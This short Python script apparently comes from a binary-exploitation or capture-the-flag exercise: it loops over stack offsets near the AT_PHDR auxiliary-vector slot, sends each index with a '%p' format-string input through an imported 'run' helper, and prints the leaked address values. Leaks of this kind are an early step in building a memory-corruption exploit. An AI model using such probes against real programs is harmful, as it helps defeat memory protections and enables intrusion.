import re
from rprobe import run
# AT_PHDR value slot = rbp+0x188 (slot 67). low byte at [rbp+0x188] -> idx=0x189
for idx in (0x188,0x189,0x18a,0x18b,0x18c):
    try:
        lk,out=run(str(idx),'%p','B')
        print('idx=%#x -> %s'%(idx,hex(lk)))
    except Exception as e: print(idx,'ERR',e)
